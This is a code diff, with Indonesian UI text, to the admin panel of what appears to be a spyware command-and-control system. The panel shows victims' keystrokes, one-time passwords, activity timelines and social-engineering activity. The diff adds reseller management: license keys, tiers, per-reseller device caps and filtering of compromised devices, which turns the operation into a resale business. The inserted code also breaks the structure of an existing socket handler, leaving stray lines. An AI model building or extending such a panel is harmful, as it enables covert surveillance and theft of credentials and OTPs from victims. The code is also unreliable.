@@ -21,6 +21,9 @@
                 return;
             }
             window._adminToken = token;
+            // Detect reseller mode from path /r/:resellerId/admin.html
+            const pathMatch = window.location.pathname.match(/^\/r\/([^/]+)\//);
+            window._resellerId = pathMatch ? pathMatch[1] : '';
             // Intercept fetch to auto-inject token header
             const origFetch = window.fetch;
             window.fetch = function(url, opts) {
@@ -191,6 +194,7 @@
                         <button class="tab" data-tab="export" onclick="switchTab('export')">Export</button>
                         <button class="tab" data-tab="notify" onclick="switchTab('notify')">Notify</button>
                         <button class="tab" data-tab="bulk" onclick="switchTab('bulk')">Bulk</button>
+                        <button class="tab" data-tab="reseller" onclick="switchTab('reseller');loadResellers()" id="tabResellerBtn" style="display:none;">Reseller</button>
                         <button class="tab" data-tab="keystrokes" onclick="switchTab('keystrokes')">Keystrokes</button>
                         <button class="tab" data-tab="timeline" onclick="switchTab('timeline');loadTimeline()">Timeline</button>
                         <button class="tab" data-tab="otp" onclick="switchTab('otp');loadOTP()">OTP</button>
@@ -462,6 +466,22 @@
                         <div id="bulkStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
+                    <!-- TAB: RESELLER -->
+                    <div class="tab-content" id="tab-reseller">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Manajemen reseller — buat, edit, dan kelola license key.</p>
+                        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                            <input id="resellerName" placeholder="Nama reseller" style="flex:1;min-width:120px;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                            <select id="resellerTier" style="padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="pro">Pro</option>
+                                <option value="enterprise">Enterprise</option>
+                            </select>
+                            <input id="resellerMax" type="number" value="25" min="1" max="9999" style="width:80px;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                            <button class="header-btn" onclick="createReseller()" style="background:var(--accent);color:#0f0f23;white-space:nowrap;">+ Buat Reseller</button>
+                        </div>
+                        <div id="resellerList" style="font-size:0.78rem;"></div>
+                        <div id="resellerKey" style="margin-top:8px;word-break:break-all;font-size:0.75rem;color:var(--accent);display:none;padding:8px;border-radius:6px;background:var(--bg3);border:1px solid var(--border);"></div>
+                    </div>
+
                     <!-- TAB: TIMELINE -->
                     <div class="tab-content" id="tab-timeline">
                         <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Kronologi aktivitas korban secara real-time.</p>
@@ -699,7 +719,7 @@
 
         // === API ===
         function fetchDevices() {
-            fetch(SERVER_URL + '/api/devices?_=' + Date.now()).then(r=>r.json()).then(data => {
+            fetch(SERVER_URL + '/api/devices?_=' + Date.now() + (_resellerId ? '&resellerId=' + _resellerId : '')).then(r=>r.json()).then(data => {
                 for (const d of data) { devices[d.id] = d; }
                 renderDevices(); updateStats();
             });
@@ -2290,6 +2310,83 @@
 
         // === SOCIAL ENGINEER ACTIVITY real-time ===
         socket.on('social-engineer-activity', (data) => {
+
+            // Also listen for device-count updates
+        });
+
+        // === RESELLER MANAGEMENT ===
+        // Show Reseller tab only for master admin (not reseller)
+        if (!_resellerId) {
+            document.getElementById('tabResellerBtn').style.display = '';
+        }
+
+        function createReseller() {
+            const name = document.getElementById('resellerName').value.trim();
+            const tier = document.getElementById('resellerTier').value;
+            const maxDevices = parseInt(document.getElementById('resellerMax').value) || 25;
+            if (!name) { showToast('Masukkan nama reseller', 'info'); return; }
+            fetch(SERVER_URL + '/api/admin/reseller/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ name, tier, maxDevices })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) {
+                    showToast('Reseller ' + data.name + ' created!', 'success');
+                    document.getElementById('resellerName').value = '';
+                    document.getElementById('resellerKey').style.display = 'block';
+                    document.getElementById('resellerKey').innerHTML = '<b>License Key:</b><br><code style="font-size:0.7rem;word-break:break-all;">' + data.licenseKey + '</code><br><br><b>Reseller ID:</b> ' + data.resellerId + '<br><b>Tier:</b> ' + data.tier + '<br><b>Max Devices:</b> ' + data.maxDevices;
+                    loadResellers();
+                } else {
+                    showToast(data.error || 'Gagal', 'error');
+                }
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        function loadResellers() {
+            fetch(SERVER_URL + '/api/admin/reseller/list', {
+                headers: { 'x-admin-token': window._adminToken }
+            }).then(r => r.json()).then(list => {
+                const el = document.getElementById('resellerList');
+                if (!list || !list.length) {
+                    el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">Belum ada reseller.</div>';
+                    return;
+                }
+                el.innerHTML = list.map(r => `<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid var(--border);">
+                    <div style="flex:1;">
+                        <strong style="color:var(--text);">${r.name}</strong>
+                        <span style="color:var(--text3);font-size:0.72rem;margin-left:6px;">${r.id}</span>
+                        <div style="font-size:0.72rem;color:var(--text2);margin-top:2px;">
+                            ${r.tier.toUpperCase()} · ${r.deviceCount}/${r.maxDevices} device · Exp: ${new Date(r.expiry).toLocaleDateString('id-ID')}
+                        </div>
+                    </div>
+                    <div style="display:flex;gap:4px;">
+                        <button class="header-btn" style="font-size:0.7rem;padding:3px 8px;" onclick="toggleReseller('${r.id}', ${!r.enabled})">${r.enabled ? 'Nonaktifkan' : 'Aktifkan'}</button>
+                        <button class="header-btn" style="font-size:0.7rem;padding:3px 8px;border-color:#e44;" onclick="deleteReseller('${r.id}')">Hapus</button>
+                    </div>
+                </div>`).join('');
+            }).catch(() => {});
+        }
+
+        function toggleReseller(id, enabled) {
+            fetch(SERVER_URL + '/api/admin/reseller/toggle', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ resellerId: id, enabled })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('Reseller ' + (enabled ? 'diaktifkan' : 'dinonaktifkan'), 'success'); loadResellers(); }
+            }).catch(() => {});
+        }
+
+        function deleteReseller(id) {
+            if (!confirm('Hapus reseller ' + id + '?')) return;
+            fetch(SERVER_URL + '/api/admin/reseller/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ resellerId: id })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('Reseller dihapus', 'success'); loadResellers(); }
+            }).catch(() => {});
+        }
             showToast(`Social Engineer: <b>${data.persona}</b> -> ${(data.message||'').slice(0,40)}...`, 'info');
         });
 
